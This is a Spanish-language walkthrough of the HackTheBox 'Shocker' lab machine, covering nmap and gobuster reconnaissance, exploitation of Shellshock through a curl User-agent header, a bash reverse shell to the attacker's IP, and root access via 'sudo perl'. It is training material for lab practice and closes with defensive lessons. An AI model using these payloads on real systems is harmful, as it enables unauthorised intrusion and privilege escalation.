---
title: HackTheBox Shocker
date: 2021-07-18 12:00:00 -0400
image: 
  path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/shocker/banner.png
  height: 1100
  width: 500  
categories: [HTB Writeups, Linux Easy]
tags: [perl, shellshock, sudo, cgi-bin, gobuster]
---

***

**Machine IP** : 10.10.10.56

**DATE**  : 18/07/2021

***

## Matriz de la maquina


Esta matriz nos muestra las características de explotación de la maquina.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/shocker/matrix.png)

## Reconocimiento


Primero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.

## Nmap 

Usamos el siguiente comando para escanear todos los puertos de una manera rapida.

```bash
nmap -p- --open -T5 -v -n -Pn 10.10.10.56
```

Posteriormente utilizamos este comando con los puertos del anterior escaneo para saber las versiones de cada servicio.

```bash
nmap -sC -sV -n -p2222,80 -Pn 10.10.10.56
```

Nos arroja este resultado:

```bash
~/HTB/shocker  nmap -sC -sV -p80,2222 10.10.10.56                                                                                                                                          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 00:02 EDT
Nmap scan report for 10.10.10.56
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site does not have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.00 seconds
```

Podemos observar dos puertos abiertos, el `2222` que pertenece a `ssh` y el `80` que es un `http`, procederemos a revisar la web que corre en el servicio http y haremos una busqueda de directorio con `gobuster`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/shocker/web.png)

Luego de probar varios diccionarios con `gobuster` encontré un directorio interesante.

```bash
gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirb/small.txt -t 100 -q -e                                                                               
http://10.10.10.56/cgi-bin/             (Status: 403) [Size: 294]

```

Investigando sobre la procedencia de este directorio encontré que se relacionaba con una vulnerabilidad que se llamaba [shellshock](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock).


Leyendo el post anterior entendí como funcionabala vulnerabilidad, entonces utilizé `gobuster` nuevamente con la flag -x para que me busque archivos con extensiones .sh, para encontrar los scripts dentro de este directorio y obtuve `user.sh`.

```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 100 -x sh -q -e 
http://10.10.10.56/cgi-bin/user.sh              (Status: 200) [Size: 126]
```

Haciendo `curl` a la pagina con el comando `whoami` para saber si funciona.

```bash
curl -H "User-agent: () { :;}; echo; /usr/bin/whoami" http://10.10.10.56/cgi-bin/user.sh
shelly
```

Vemos que nos responde con el usuario `shelly` ejecutando el comando `whoami`, entonces trataremos de obtener una `reverse shell` con el comando.

```bash
curl -H  "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.16.18/443 0>&1" http://10.10.10.56/cgi-bin/user.sh
```
Haciendo un `netcat -nlvp 443` en nuestra maquina, obtenemos una `shell reversa` con el usuario `shelly` y el `user.txt`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/shocker/usertxt.png)

## Escalamiento de privilegios

Luego de obtener acceso como el usuario david, probé con `sudo -l` para listar los `binarios` que se pueden ejecutar como sudo, se aprecia que se puede ejecutar el binario `perl` con permisos `root`, entonces este vector de ataque ya es conocido.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/shocker/sudol.png)

Nos vamos a nuestra mejor amiga [GTFOBINS](https://gtfobins.github.io/gtfobins/perl/#sudo) y encontramos el siguiente comando que llama a una shell como `sudo` con el binario `perl`.

```bash
sudo perl -e 'exec "/bin/sh";'
```

Obtenemos acceso `root` y el `root.txt`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/shocker/roottxt.png)

## Conclusiones

Fue una buena maquina para aprender lecciones puntuales como las siguientes...

Hubo una mala configuración del servidor web. No se me permitía acceder al directorio `/cgi-bin` pero por alguna razón se me permitía acceder al archivo `user.sh` dentro de ese directorio, el administrador debería haber restringido el acceso a todos los archivos del directorio.

Otro detalle es que el servidor web estaba ejecutando comandos bash en un sistema que ejecutaba una versión de Bash que era vulnerable a la vulnerabilidad `Shellshock`, esto nos permitió obtener el acceso inicial al sistema.

El ultimo detalle fue configuración insegura del sistema, siempre hay que ajustarse al `principio de mínimo privilegio` y al concepto de separación de privilegios.

Dar al usuario `sudo` acceso para ejecutar `perl`, me permitió  escalar privilegios.

Recomendaría mantener actualizada las versiones de bash para que no interpete `() { :; };` de una manera erronea.

Evita jugar con la configuración de sudo si no estás seguro de lo que haces y de cómo se puede abusar de ello. Echa un vistazo a `GTFObins` para empezar..

Gracias por leer, Happy hacking and always try harder!